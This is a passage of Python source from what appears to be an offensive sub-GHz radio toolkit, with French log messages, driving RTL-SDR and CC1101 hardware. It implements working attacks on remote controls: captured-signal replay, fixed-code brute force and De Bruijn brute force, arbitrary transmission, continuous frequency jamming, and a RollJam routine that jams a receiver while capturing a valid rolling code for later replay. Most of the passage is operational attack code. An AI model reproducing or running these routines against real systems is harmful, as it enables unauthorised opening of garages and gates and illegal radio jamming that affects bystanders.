                 f"({size_kb} KB)")
            _log(f"   📊 Aucune activité significative — le fichier "
                 f"contient probablement du bruit ambiant.")

        # ── Analyse post-capture avec rtl_433 ──
        signals = self._post_analyze(out_file, freq)
        if signals:
            any_rolling = False
            for s in signals[:5]:
                if s["rolling_code"]:
                    any_rolling = True
                    _log(f"   ⚠️ <b>{s['name']}</b> — ROLLING CODE", "warn")
                    if s["id"]:
                        _log(f"      {s['id']}")
                    _log(f"      ⛔ Le replay NE FONCTIONNE PAS — le "
                         f"récepteur rejette les codes déjà vus.")
                else:
                    _log(f"   🔍 Protocole : <b>{s['name']}</b>")
                    if s["id"]:
                        _log(f"      {s['id']}")
            if any_rolling:
                _log(f"   💡 Rolling code : seul le RollJam "
                     f"(brouillage + capture) peut fonctionner.")
            elif signals:
                _log(f"   ✅ Protocole(s) compatible(s) replay !")
            if len(signals) > 1:
                _log(f"   ⚠️ {len(signals)} protocoles mélangés — "
                     f"enregistre chaque appareil séparément.")
        elif bursts:
            _log(f"   🔍 Protocole non reconnu — essaie "
                 f"« Identifier un protocole »")
        _log(f"   ✏️ Utilise le bouton renommer dans « Replay » "
             f"pour nommer ce signal.")

        any_rolling = any(s.get("rolling_code") for s in signals)
        return {"ok": True, "file": str(out_file), "size_kb": size_kb,
                "bursts": len(bursts), "signals_detected": len(signals),
                "rolling_code": any_rolling,
                "message": f"Signal enregistré ({size_kb} KB)."
                           + (" ⚠️ Rolling code détecté !"
                              if any_rolling else "")}

    # Protocoles rolling code connus
    _ROLLING_KEYWORDS = [
        "hcs", "keeloq", "rolling", "nice-flor", "nice_flor",
        "came-twee", "came_twee", "somfy", "rts", "faac",
        "chamberlain", "liftmaster",
    ]

    def _post_analyze(self, raw_file: Path, freq: str) -> List[Dict]:
        """Analyse rapide avec rtl_433 — retourne les protocoles détectés.

        Chaque élément : {"name", "rolling_code", "id", "raw_line"}.
        """
        if not _which("rtl_433"):
            return []
        try:
            res = _run([
                "rtl_433", "-r", str(raw_file),
                "-f", str(freq), "-s", "250000",
            ], timeout=15)
            out = (res.stdout or "") + (res.stderr or "")
            seen: set = set()
            signals: List[Dict] = []
            for line in out.splitlines():
                if "model" in line.lower() and ":" in line:
                    parts = line.split(":", 1)
                    if len(parts) != 2:
                        continue
                    rest = parts[1].strip()
                    name = rest.split(",")[0].strip()
                    if not name or name in seen:
                        continue
                    seen.add(name)
                    rolling = any(kw in name.lower()
                                  for kw in self._ROLLING_KEYWORDS)
                    # Extraire l'ID si présent
                    sig_id = ""
                    for seg in rest.split(","):
                        seg = seg.strip()
                        if seg.lower().startswith("id"):
                            sig_id = seg
                            break
                    signals.append({
                        "name": name,
                        "rolling_code": rolling,
                        "id": sig_id,
                        "raw_line": rest[:200],
                    })
            return signals
        except Exception:
            return []

    # ── Gestion des signaux (rename / delete) ──────────────────────

    def _rename_signal(self, p: Dict) -> Dict:
        """Renomme un fichier signal."""
        file_path = p.get("file", "")
        new_name = p.get("name", "").strip()
        if not file_path:
            return {"ok": False, "error": "Aucun fichier spécifié."}
        if not new_name:
            return {"ok": False, "error": "Aucun nom spécifié."}

        safe_name = re.sub(r'[^\w\s-]', '', new_name).strip()
        safe_name = safe_name.replace(' ', '_')[:40]
        if not safe_name:
            return {"ok": False, "error": "Nom invalide."}

        src = Path(file_path)
        if not src.exists():
            return {"ok": False, "error": "Fichier introuvable."}

        # Reconstruire le nom : NOM_freq_timestamp.ext
        parts = src.stem.split("_")
        # Trouver la partie fréquence (nombre > 1 MHz)
        freq_idx = None
        for i, part in enumerate(parts):
            if part.isdigit() and int(part) > 1_000_000:
                freq_idx = i
                break
        if freq_idx is not None:
            # Garder freq + timestamp, remplacer le prefix
            suffix = "_".join(parts[freq_idx:])
            new_stem = f"{safe_name}_{suffix}"
        else:
            new_stem = f"{safe_name}_{src.stem}"

        new_file = src.parent / f"{new_stem}{src.suffix}"

        # Renommer dans les deux répertoires (tmp + data)
        for d in [CAPTURE_DIR, DATA_DIR]:
            old = d / src.name
            if old.exists():
                dst = d / f"{new_stem}{src.suffix}"
                old.rename(dst)

        return {"ok": True,
                "message": f"Signal renommé : {new_file.name}"}

    def _delete_signal(self, p: Dict) -> Dict:
        """Supprime un fichier signal."""
        file_path = p.get("file", "")
        if not file_path:
            return {"ok": False, "error": "Aucun fichier spécifié."}

        name = Path(file_path).name
        deleted = 0
        for d in [CAPTURE_DIR, DATA_DIR]:
            f = d / name
            if f.exists():
                f.unlink()
                deleted += 1

        if deleted:
            return {"ok": True, "message": f"Signal supprimé : {name}"}
        return {"ok": False, "error": "Fichier introuvable."}

    # ──────────────────────────────────────────────────────────────────

    def _analyze_signal(self, p: Dict) -> Dict:
        """rtl_433 -A : tente d'analyser un signal inconnu."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}
        if not _which("rtl_433"):
            return {"ok": False, "error": "rtl_433 non installé"}

        freq = _resolve_freq(p)
        duration = int(p.get("duration", 30))

        _log(f"🔬 Analyse de protocole sur <b>{_freq_display(freq)}</b> ({duration}s)")
        _log(f"   📱 <b>Appuie sur la télécommande pendant l'analyse !</b>")
        _log(f"   Le décodeur va tenter d'identifier la modulation et les données.")

        cmd = [
            "sudo", "timeout", str(duration),
            "rtl_433",
            "-f", str(freq),
            "-g", "49",
            "-A",
        ]
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        output_lines = []
        found_analysis = False
        signal_count = 0
        modulations: Dict[str, int] = {}   # compteur par type de modulation
        last_progress = 0
        MAX_DETAIL = 3   # afficher les détails des N premiers signaux
        start = time.time()
        while time.time() - start < duration + 2:
            _check_stop()
            if proc.poll() is not None:
                break
            elapsed = int(time.time() - start)
            if elapsed - last_progress >= 10 and not found_analysis:
                _log(f"   ⏳ {elapsed}/{duration}s — en attente de signal…")
                last_progress = elapsed
            rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
            if rlist:
                line = proc.stdout.readline()
                if not line:
                    continue
                line = line.rstrip()
                clean = re.sub(r'\x1b\[[0-9;]*m', '', line)
                if not clean or clean.startswith("rtl_433 version") or \
                   "usb_open" in clean or "sdr_open" in clean:
                    continue
                output_lines.append(clean)
                low = clean.lower()

                # Nouveau signal détecté
                if "analyzing" in low or "*** signal" in low:
                    signal_count += 1
                    found_analysis = True
                    if signal_count <= MAX_DETAIL:
                        _log(f"🔍 <b>Signal #{signal_count} détecté</b>")
                    elif signal_count == MAX_DETAIL + 1:
                        _log(f"   … signaux suivants comptés "
                             f"silencieusement")
                # Protocole reconnu
                elif "model" in low and ":" in clean:
                    _log(f"   🔍 {escape(clean[:200])}")
                # Modulation détectée — toujours utile mais condensé
                elif "guessing modulation" in low:
                    mod = clean.split(":", 1)[1].strip() if ":" in clean \
                        else clean
                    modulations[mod] = modulations.get(mod, 0) + 1
                    if signal_count <= MAX_DETAIL:
                        _log(f"   📋 <b>Modulation : {escape(mod)}</b>")
                # Codes hex — tronqué et seulement les premiers signaux
                elif "codes" in low and ":" in clean:
                    if signal_count <= MAX_DETAIL:
                        trunc = clean[:120]
                        if len(clean) > 120:
                            trunc += f"… ({len(clean)} car.)"
                        _log(f"   📋 {escape(trunc)}")
                # Bits / demod — seulement les premiers signaux
                elif signal_count <= MAX_DETAIL and \
                     any(kw in low for kw in ["bits", "demod"]):
                    _log(f"   📋 {escape(clean[:150])}")
                # Ignorer pulse/gap/short/long — trop verbeux

        if proc.poll() is None:
            proc.terminate()

        if found_analysis:
            _log(f"\n✅ <b>{signal_count} signal(aux) analysé(s)</b>")
            if modulations:
                for mod, cnt in sorted(modulations.items(),
                                       key=lambda x: x[1], reverse=True):
                    _log(f"   📊 {mod} — {cnt}× détecté")
            if signal_count > MAX_DETAIL:
                _log(f"   ({signal_count - MAX_DETAIL} signal(aux) "
                     f"supplémentaire(s) non détaillé(s))")
            _log(f"   💡 Les infos de modulation et timing permettent "
                 f"de reproduire le signal.")
        elif output_lines:
            _log(f"⚠️ Signal partiel capté ({len(output_lines)} lignes) — "
                 f"essaie plus longtemps.", "warn")
        else:
            _log("📭 Aucun signal capté.", "warn")
            _log("   Approche la télécommande de l'antenne et réessaie "
                 "avec une durée plus longue.")

        return {
            "ok": True,
            "lines": len(output_lines),
            "output": "\n".join(output_lines[-50:]),
            "message": f"Analyse terminée — {len(output_lines)} lignes."
                       if output_lines else "Aucun signal à analyser.",
        }

    # ════════════════════════════════════════════════════════════════════
    #  ACTIF — CC1101 (stubs, fonctionnels quand hardware branché)
    # ════════════════════════════════════════════════════════════════════

    def _require_cc1101(self) -> Optional[Dict]:
        """Retourne un dict erreur si CC1101 absent, sinon None."""
        # Re-détecter si pas encore testé ou cache négatif
        if not self._cc1101_ok:
            self._cc1101_ok = _detect_cc1101()
        if not self._cc1101_ok:
            return {
                "ok": False,
                "error": "CC1101 non connecté — vérifie le câblage SPI.",
            }
        return None

    def _replay(self, p: Dict) -> Dict:
        """Rejoue un signal capturé via CC1101."""
        err = self._require_cc1101()
        if err:
            return err

        signal_file = p.get("signal_file", "")
        freq = _resolve_freq_int(p)
        repeat = int(p.get("repeat", 5))

        if not signal_file or not Path(signal_file).exists():
            return {"ok": False,
                    "error": f"Fichier introuvable : {signal_file}. "
                             f"Enregistre d'abord un signal."}

        _log(f"📤 Replay du signal sur <b>{_freq_display(str(freq))}</b>")
        _log(f"   Fichier : {Path(signal_file).name}")
        _log(f"   {repeat} transmission(s) programmée(s)")

        # Le CC1101 FIFO = 64 octets, lib assert status SPI constants
        # → max ~45 octets/paquet. Le script print TX N/total en temps réel.
        replay_script = (
            f"import cc1101, pathlib, time, sys\n"
            f"raw = pathlib.Path('{signal_file}').read_bytes()\n"
            f"data = raw[:255]\n"
            f"CHUNK = 45\n"
            f"chunks = [data[i:i+CHUNK] for i in range(0, len(data), CHUNK)]\n"
            f"print(f'CHUNKS:{{len(chunks)}} BYTES:{{len(data)}}', flush=True)\n"
            f"def safe_tx(t, c):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(c)\n"
            f"            return True\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"    return False\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    for i in range({repeat}):\n"
            f"        for c in chunks:\n"
            f"            safe_tx(t, c)\n"
            f"            time.sleep(0.02)\n"
            f"        print(f'TX:{{i+1}}/{repeat}', flush=True)\n"
            f"        time.sleep(0.1)\n"
            f"print('OK')\n"
        )
        def on_replay_line(line):
            if line.startswith("CHUNKS:"):
                parts = line.split()
                nb = parts[0].split(":")[1]
                sz = parts[1].split(":")[1] if len(parts) > 1 else "?"
                _log(f"   📦 {sz} octets en {nb} paquets")
            elif line.startswith("TX:"):
                n = line.split(":")[1]
                _log(f"   📤 Transmission <b>{n}</b> envoyée")

        output = _run_live(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3",
             "-c", replay_script],
            timeout=30, on_line=on_replay_line)

        if "OK" in output:
            _log(f"✅ Signal rejoué <b>{repeat}x</b> — si le récepteur "
                 f"utilise un code fixe, il devrait réagir.")
            return {"ok": True, "transmissions": repeat,
                    "message": f"Signal rejoué {repeat} fois."}
        else:
            _log(f"❌ Replay échoué", "error")
            return {"ok": False, "error": output.strip()[-200:]}

    def _bruteforce(self, p: Dict) -> Dict:
        """Brute force de codes fixes OOK via CC1101."""
        err = self._require_cc1101()
        if err:
            return err

        freq = _resolve_freq_int(p)
        bits = int(p.get("bits", 12))
        baudrate = int(p.get("baudrate", 2000))
        total = 2 ** bits
        byte_count = (bits + 7) // 8

        # Pause dynamique : plus le baudrate est bas, plus le TX prend du temps
        tx_time = byte_count * 8 / baudrate
        pause = max(0.06, tx_time * 3 + 0.03)
        eta = total * (tx_time + pause)

        _log(f"🔓 Brute force sur <b>{_freq_display(str(freq))}</b>")
        _log(f"   {bits} bits = <b>{total:,} codes</b> à tester")
        _log(f"   Vitesse : {baudrate} bps · pause : {pause*1000:.0f}ms "
             f"· durée estimée : ~{eta:.0f}s")

        step = max(1, total // 20)
        bf_script = (
            f"import cc1101, time, sys\n"
            f"pause = {pause}\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    t.set_symbol_rate_baud({baudrate})\n"
            f"    errs = 0\n"
            f"    def safe_tx(t, d):\n"
            f"        for r in range(3):\n"
            f"            try:\n"
            f"                t.transmit(d)\n"
            f"                return True\n"
            f"            except RuntimeError:\n"
            f"                time.sleep(0.02 * (r + 1))\n"
            f"        return False\n"
            f"    for code in range({total}):\n"
            f"        data = code.to_bytes({byte_count}, 'big')\n"
            f"        if not safe_tx(t, data):\n"
            f"            errs += 1\n"
            f"        time.sleep(pause)\n"
            f"        if code % {step} == 0 and code > 0:\n"
            f"            pct = code * 100 // {total}\n"
            f"            print(f'P:{{pct}} C:{{code}}', flush=True)\n"
            f"print(f'DONE E:{{errs}}')\n"
        )

        def on_bf_line(line):
            if line.startswith("P:"):
                parts = line.split()
                pct = parts[0].split(":")[1]
                code = parts[1].split(":")[1] if len(parts) > 1 else "?"
                bar = "█" * (int(pct) // 10) + "░" * (10 - int(pct) // 10)
                _log(f"   🔓 {bar} {pct}% — code {code}/{total:,}")

        output = _run_live(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3",
             "-c", bf_script],
            timeout=int(eta) + 60, on_line=on_bf_line)

        if "DONE" in output:
            errs = ""
            for line in output.splitlines():
                if line.startswith("DONE") and "E:" in line:
                    e = line.split("E:")[1].strip()
                    if e != "0":
                        errs = f" ({e} récupérations TX)"
            _log(f"✅ <b>{total:,} codes testés</b>{errs} — si le "
                 f"récepteur utilise un code fixe {bits}-bit, "
                 f"l'un d'eux a fonctionné.")
            return {"ok": True, "codes_tested": total,
                    "message": f"Brute force terminé — {total:,} codes testés."}
        else:
            _log(f"❌ Brute force interrompu", "error")
            if output.strip():
                _log(f"   {output.strip()[-200:]}", "error")
            return {"ok": False, "error": output.strip()[-200:] or "erreur"}

    def _debruijn(self, p: Dict) -> Dict:
        """Séquence De Bruijn pour brute force optimisé."""
        err = self._require_cc1101()
        if err:
            return err

        freq = _resolve_freq_int(p)
        bits = int(p.get("bits", 12))
        total = 2 ** bits
        seq_len = total + bits - 1

        _log(f"🔓 De Bruijn sur <b>{_freq_display(str(freq))}</b>")
        _log(f"   {bits} bits → séquence de {seq_len:,} symboles")
        _log(f"   ⚡ ~{total * bits // seq_len}x plus rapide que le "
             f"brute force classique")

        debruijn_script = (
            f"import cc1101, time\n"
            f"def debruijn(k, n):\n"
            f"    a = [0] * (k * n)\n"
            f"    seq = []\n"
            f"    def db(t, p):\n"
            f"        if t > n:\n"
            f"            if n % p == 0:\n"
            f"                seq.extend(a[1:p+1])\n"
            f"        else:\n"
            f"            a[t] = a[t - p]\n"
            f"            db(t + 1, p)\n"
            f"            for j in range(a[t - p] + 1, k):\n"
            f"                a[t] = j\n"
            f"                db(t + 1, t)\n"
            f"    db(1, 1)\n"
            f"    return seq\n"
            f"seq = debruijn(2, {bits})\n"
            f"data = bytes(int(''.join(str(b) for b in seq[i:i+8]), 2)\n"
            f"             for i in range(0, len(seq), 8))\n"
            f"errs = 0\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    chunks = [data[i:i+45] for i in range(0, len(data), 45)]\n"
            f"    for ci, chunk in enumerate(chunks):\n"
            f"        for retry in range(3):\n"
            f"            try:\n"
            f"                t.transmit(chunk)\n"
            f"                break\n"
            f"            except RuntimeError:\n"
            f"                time.sleep(0.02 * (retry + 1))\n"
            f"        else:\n"
            f"            errs += 1\n"
            f"        time.sleep(0.01)\n"
            f"print(f'DONE {{len(seq)}} symbols errs={{errs}}')\n"
        )
        res = _run(["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3", "-c", debruijn_script], timeout=120)
        if "DONE" in (res.stdout or ""):
            _log(f"✅ <b>{total:,} codes couverts</b> en une séquence optimisée")
            return {"ok": True, "codes_covered": total,
                    "message": f"De Bruijn terminé — {total:,} codes couverts."}
        else:
            return {"ok": False, "error": (res.stderr or "erreur")}

    def _transmit_custom(self, p: Dict) -> Dict:
        """Transmission de données arbitraires via CC1101."""
        err = self._require_cc1101()
        if err:
            return err

        freq = _resolve_freq_int(p)
        modulation = p.get("modulation", "OOK")
        data_hex = p.get("data_hex", "AABB0102")
        repeat = int(p.get("repeat", 3))

        _log(f"📤 Transmission sur <b>{_freq_display(str(freq))}</b>")
        _log(f"   Modulation : {modulation} · données : 0x{data_hex}")
        _log(f"   {repeat} répétition(s)")

        mod_map = {"OOK": 3, "2FSK": 0, "GFSK": 1, "MSK": 7}
        mod_val = mod_map.get(modulation, 3)

        tx_script = (
            f"import cc1101, time\n"
            f"data = bytes.fromhex('{data_hex}')\n"
            f"def safe_tx(t, d):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(d)\n"
            f"            return True\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"    return False\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    for i in range({repeat}):\n"
            f"        safe_tx(t, data)\n"
            f"        time.sleep(0.05)\n"
            f"        print(f'TX {{i+1}}/{repeat}')\n"
            f"print('OK')\n"
        )
        res = _run(["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3", "-c", tx_script], timeout=30)
        if "OK" in (res.stdout or ""):
            _log(f"✅ <b>{repeat} transmission(s)</b> envoyée(s)")
            return {"ok": True, "transmissions": repeat,
                    "message": f"Transmis {repeat}x sur {_freq_display(str(freq))}."}
        else:
            return {"ok": False, "error": (res.stderr or "erreur")}

    def _test_tx(self, p: Dict) -> Dict:
        """Test émission CC1101 — le RTL-SDR vérifie la réception RF."""
        err = self._require_cc1101()
        if err:
            return err
        if not self._rtlsdr_ok:
            return {"ok": False,
                    "error": "RTL-SDR requis pour vérifier l'émission."}

        freq = _resolve_freq_int(p)
        test_file = SDR_DIR / "tx_test.raw"
        if test_file.exists():
            test_file.unlink()

        _log(f"🔬 Test émetteur CC1101 sur <b>{_freq_display(str(freq))}</b>")
        _log(f"   Le RTL-SDR écoute · le CC1101 émet · on compare l'énergie.")

        sample_rate = 250000
        # 1) RTL-SDR capture en arrière-plan (12s)
        rtl_proc = subprocess.Popen(
            ["sudo", "timeout", "15", "rtl_sdr",
             "-f", str(freq), "-s", str(sample_rate), "-g", "49",
             "-n", str(sample_rate * 12), str(test_file)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        _log(f"   📻 RTL-SDR en écoute…")
        time.sleep(3)
        _check_stop()

        # 2) Mesure énergie de base (avant TX)
        peak_base, avg_base, _ = _read_energy(test_file, 0)
        _log(f"   Bruit de fond : {_energy_bar(peak_base)} pic={peak_base}")

        # 3) CC1101 émet 30 bursts rapides (duty cycle plus élevé)
        n_bursts = 30
        _log(f"   📤 CC1101 émet {n_bursts} bursts…")
        tx_script = (
            f"import cc1101, time\n"
            f"data = bytes([0xAA, 0x55] * 22 + [0xFF])\n"
            f"def safe_tx(t, d):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(d)\n"
            f"            return\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    for i in range({n_bursts}):\n"
            f"        safe_tx(t, data)\n"
            f"        if (i+1) % 10 == 0:\n"
            f"            print(f'TX:{{i+1}}', flush=True)\n"
            f"        time.sleep(0.02)\n"
            f"print('OK')\n"
        )
        tx_output = _run_live(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3",
             "-c", tx_script],
            timeout=20,
            on_line=lambda l: _log(f"   📤 Burst {l.split(':')[1]}/{n_bursts}")
            if l.startswith("TX:") else None)

        tx_ok = "OK" in tx_output

        # 4) Attendre fin capture et analyser
        time.sleep(1.5)
        if rtl_proc.poll() is None:
            rtl_proc.terminate()
            rtl_proc.wait(timeout=5)

        if not test_file.exists() or test_file.stat().st_size < 200000:
            _log(f"❌ Le RTL-SDR n'a pas capté de données.", "error")
            return {"ok": False, "error": "Capture RTL-SDR insuffisante."}

        # Analyse par fenêtre glissante — détecte les bursts courts
        raw = test_file.read_bytes()
        total = len(raw)

        def calc_energy(buf):
            devs = [abs(b - 128) for b in buf]
            pk = max(devs) if devs else 0
            av = sum(devs) / len(devs) if devs else 0.0
            return pk, av

        # Baseline : première partie (avant TX, ~3s)
        baseline_end = min(sample_rate * 3, total // 3)
        peak_b, avg_b = calc_energy(raw[:baseline_end])

        # Pendant TX : fenêtre glissante pour trouver le pic d'énergie
        # Les bursts font ~2ms → ~500 samples à 250ksps
        # On prend des fenêtres de 5000 samples (~20ms) pour couvrir
        # les bursts + espace entre eux
        tx_start = baseline_end
        tx_end = min(total, sample_rate * 10)
        window = 5000
        best_peak = 0
        best_avg = 0.0
        best_window_avg = 0.0
        for offset in range(tx_start, tx_end - window, window // 2):
            chunk = raw[offset:offset + window]
            wp, wa = calc_energy(chunk)
            if wp > best_peak:
                best_peak = wp
            if wa > best_window_avg:
                best_window_avg = wa

        # Moyenne globale pendant TX (pour les barres)
        peak_t, avg_t = calc_energy(raw[tx_start:tx_end])

        _log(f"\n📊 <b>Résultat du test :</b>")
        _log(f"   Baseline    : pic={peak_b}  moy={avg_b:.1f}  "
             f"{_energy_bar(peak_b)}")
        _log(f"   Pendant TX  : pic={best_peak}  moy_globale={avg_t:.1f}  "
             f"moy_fenêtre_max={best_window_avg:.1f}  "
             f"{_energy_bar(best_peak)}")

        # Détection plus sensible : pic OU fenêtre max
        peak_delta = best_peak - peak_b
        window_ratio = best_window_avg / max(avg_b, 0.5)

        if peak_delta > 15 or (peak_delta > 5 and window_ratio > 1.3):
            _log(f"\n✅ <b>CC1101 émet correctement !</b>")
            _log(f"   Pic +{peak_delta} · fenêtre ×{window_ratio:.1f}")
            _log(f"   💡 Si le replay ne fonctionne pas, c'est probablement "
                 f"un rolling code (pas un défaut matériel).")
            return {"ok": True, "tx_works": True,
                    "peak_delta": peak_delta,
                    "message": "CC1101 émet correctement."}
        elif peak_delta > 3 or window_ratio > 1.1:
            _log(f"\n⚠️ <b>Signal faible détecté</b>", "warn")
            _log(f"   Pic +{peak_delta} · fenêtre ×{window_ratio:.1f}")
            _log(f"   Le CC1101 semble émettre. Vérifie l'antenne.")
            return {"ok": True, "tx_works": "weak",
                    "message": "CC1101 émet faiblement — vérifie l'antenne."}
        else:
            if not tx_ok:
                _log(f"\n❌ <b>Le CC1101 n'a pas pu émettre</b>", "error")
                _log(f"   Erreur : {tx_output.strip()[-200:]}")
            else:
                _log(f"\n❌ <b>Aucune émission RF détectée</b>", "error")
                _log(f"   Pic +{peak_delta} · fenêtre ×{window_ratio:.1f}")
                _log(f"   Le CC1101 dit avoir émis, mais rien capté.")
            _log(f"   Vérifie :")
            _log(f"   1. Antenne connectée au CC1101")
            _log(f"   2. Câblage SPI correct")
            _log(f"   3. Module CC1101 fonctionnel")
            return {"ok": False, "tx_works": False,
                    "error": "Aucune émission détectée."}

    # ════════════════════════════════════════════════════════════════════
    #  ROGUE — CC1101
    # ════════════════════════════════════════════════════════════════════

    def _jamming(self, p: Dict) -> Dict:
        """Brouillage continu d'une fréquence via CC1101."""
        err = self._require_cc1101()
        if err:
            return err

        freq = _resolve_freq_int(p)
        duration = int(p.get("duration", 30))

        _log(f"📡 Brouillage sur <b>{_freq_display(str(freq))}</b> ({duration}s)")
        _log(f"   ⚠️ Toute communication sur cette fréquence sera bloquée.",
             "warn")

        # Baudrate élevé → TX rapide → plus de paquets/sec
        # + try/except avec strobe SFTX pour récupérer si "device must be idle"
        jam_script = (
            f"import cc1101, time, os, sys\n"
            f"def safe_tx(t, d):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(d)\n"
            f"            return True\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"    return False\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    t.set_symbol_rate_baud(50000)\n"
            f"    end = time.time() + {duration}\n"
            f"    count = 0\n"
            f"    errs = 0\n"
            f"    last_sec = 0\n"
            f"    while time.time() < end:\n"
            f"        noise = os.urandom(45)\n"
            f"        if safe_tx(t, noise):\n"
            f"            count += 1\n"
            f"        else:\n"
            f"            errs += 1\n"
            f"        time.sleep(0.01)\n"
            f"        sec = int(time.time() - end + {duration})\n"
            f"        if sec != last_sec:\n"
            f"            last_sec = sec\n"
            f"            print(f'T:{{sec}} P:{{count}}', flush=True)\n"
            f"print(f'DONE {{count}} E:{{errs}}')\n"
        )

        def on_jam_line(line):
            if line.startswith("T:"):
                parts = line.split()
                sec = parts[0].split(":")[1]
                pkt = parts[1].split(":")[1] if len(parts) > 1 else "?"
                _log(f"   📡 {sec}/{duration}s — {pkt} paquets envoyés")

        output = _run_live(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3",
             "-c", jam_script],
            timeout=duration + 15, on_line=on_jam_line)

        if "DONE" in output:
            for line in output.splitlines():
                if line.startswith("DONE"):
                    parts = line.split()
                    total = parts[1] if len(parts) > 1 else "?"
                    errs = ""
                    for pp in parts:
                        if pp.startswith("E:") and pp != "E:0":
                            errs = f" ({pp.split(':')[1]} récupérations)"
                    _log(f"✅ Brouillage terminé — <b>{total} paquets</b>"
                         f" en {duration}s{errs}")
                    return {"ok": True, "packets": total,
                            "message": f"Brouillage terminé ({duration}s)."}
            _log(f"✅ Brouillage terminé")
            return {"ok": True,
                    "message": f"Brouillage terminé ({duration}s)."}
        else:
            _log(f"❌ Brouillage échoué", "error")
            return {"ok": False,
                    "error": output.strip()[-200:] or "erreur"}

    def _rolljam(self, p: Dict) -> Dict:
        """Rolljam : CC1101 brouille + RTL-SDR capture le code valide."""
        err = self._require_cc1101()
        if err:
            return err
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR requis pour le rolljam "
                                          "(capture pendant le brouillage)"}

        freq = _resolve_freq_int(p)
        duration = int(p.get("duration", 60))

        _log(f"🎯 Rolljam sur <b>{_freq_display(str(freq))}</b> ({duration}s)")
        _log(f"   Le CC1101 brouille pendant que le RTL-SDR capture.")
        _log(f"   📱 <b>Appuie sur la télécommande cible maintenant !</b>")
        _log(f"   Le récepteur ne verra pas le signal, mais nous oui.")

        _ensure_capture_dir()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        capture_file = CAPTURE_DIR / f"rolljam_{freq}_{timestamp}.raw"

        jam_freq = freq + 50000

        rtl_proc = subprocess.Popen(
            ["sudo", "timeout", str(duration), "rtl_sdr",
             "-f", str(freq), "-s", "250000", "-g", "49",
             "-n", str(250000 * duration),
             str(capture_file)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        jam_script = (
            f"import cc1101, time, os\n"
            f"def safe_tx(t, d):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(d)\n"
            f"            return\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({jam_freq})\n"
            f"    t.set_symbol_rate_baud(50000)\n"
            f"    end = time.time() + {duration}\n"
            f"    while time.time() < end:\n"
            f"        noise = os.urandom(45)\n"
            f"        safe_tx(t, noise)\n"
            f"        time.sleep(0.01)\n"
            f"print('JAM_DONE')\n"
        )
        jam_proc = subprocess.Popen(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3", "-c", jam_script],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        start = time.time()
        while time.time() - start < duration + 5:
            _check_stop()
            time.sleep(2)
            elapsed = int(time.time() - start)
            if elapsed % 15 == 0 and elapsed > 0:
                _log(f"⏳ Rolljam en cours… {elapsed}/{duration}s")
            if rtl_proc.poll() is not None and jam_proc.poll() is not None:
                break

        for proc in [rtl_proc, jam_proc]:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()

        if capture_file.exists() and capture_file.stat().st_size > 0:
            size_kb = capture_file.stat().st_size // 1024
            _log(f"✅ Capture rolljam — <b>{capture_file.name}</b> "
                 f"({size_kb} KB)")
            _log(f"   💡 Le fichier contient potentiellement un code "
                 f"valide à extraire et rejouer.")
            return {"ok": True, "file": str(capture_file), "size_kb": size_kb,
                    "message": f"Rolljam terminé — capture de {size_kb} KB."}
        else:
            _log("❌ Aucune donnée capturée.", "error")
            _log("   Vérifie que la télécommande a bien émis pendant "
                 "l'attaque.")
            return {"ok": False, "error": "Aucune capture."}
